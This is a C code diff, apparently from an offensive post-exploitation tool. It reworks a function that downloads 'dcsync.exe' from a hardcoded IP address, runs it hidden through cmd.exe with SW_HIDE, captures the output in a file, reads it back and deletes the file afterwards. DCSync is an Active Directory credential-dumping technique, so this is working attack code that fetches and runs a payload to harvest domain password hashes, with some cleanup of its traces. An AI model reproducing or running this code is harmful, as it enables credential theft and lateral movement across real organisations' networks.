@@ -66,54 +66,75 @@ KeyValuePair* parseDCSyncerResult(const char* result, int* count) {
 char* DownloadAndExecuteDCSyncer() {
     const char* url = "http://192.168.29.245/dcsync.exe";
     const char* filePath = "dcsync.exe";
+    const char* outputFilePath = "dcsyncer_output.txt";
 
+	// Download DCSyncer
     if (!DownloadFile(url, filePath)) {
         printf("[!] Failed to download file: %s\n", filePath);
         return NULL;
     }
     printf("[+] File downloaded successfully: %s\n", filePath);
 
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-    HANDLE hRead, hWrite;
+    // Execute the DCSyncer and redirect output to a file
+    char command[512];
+    snprintf(command, sizeof(command), "cmd.exe /C %s > %s", filePath, outputFilePath);
+    WinExec(command, SW_HIDE);
 
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
-        printf("[!] Failed to create pipe\n");
+    // Wait for the process to complete
+    DWORD waitTime = 1000; // 1 second
+    DWORD maxWaitTime = 60000; // 60 seconds
+    DWORD elapsedTime = 0;
+
+    while (elapsedTime < maxWaitTime) {
+        Sleep(waitTime);
+        elapsedTime += waitTime;
+
+        // Check if the output file exists and is not empty
+        HANDLE hFile = CreateFileA(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            CloseHandle(hFile);
+            if (fileSize > 0) {
+                break;
+            }
+        }
+    }
+
+    // Read the content of the output file
+    HANDLE hFile = CreateFileA(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] Failed to open output file: %s\n", outputFilePath);
         return NULL;
     }
 
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = hWrite;
-    si.hStdError = hWrite;
-
-    if (!CreateProcessA(NULL, (LPSTR)filePath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-        printf("[!] Failed to execute file: %s\n", filePath);
-        CloseHandle(hRead);
-        CloseHandle(hWrite);
+    //Create buffer to store contents
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    char* result = (char*)malloc(fileSize + 1);
+    if (!result) {
+        printf("[!] Failed to allocate memory for result\n");
+        CloseHandle(hFile);
         return NULL;
     }
 
-    CloseHandle(hWrite);
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
+	// Read the content of the file
     DWORD bytesRead;
-    char buffer[4096];
-    char* result = (char*)malloc(1);
-    result[0] = '\0';
-    DWORD totalBytesRead = 0;
-
-    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-        buffer[bytesRead] = '\0';
-        totalBytesRead += bytesRead;
-        result = (char*)realloc(result, totalBytesRead + 1);
-        strcat(result, buffer);
+    if (!ReadFile(hFile, result, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        printf("[!] Failed to read output file\n");
+        free(result);
+        CloseHandle(hFile);
+        return NULL;
     }
 
-    CloseHandle(hRead);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    result[fileSize] = '\0'; // Null-terminate the result
 
+    CloseHandle(hFile);
+
+	printf("[+] Output: %s\n", result);
+
+    // Delete the output file
+    if (!DeleteFileA(outputFilePath)) {
+        printf("[!] Failed to delete output file: %s\n", outputFilePath);
+    }
     return result;
 }
 
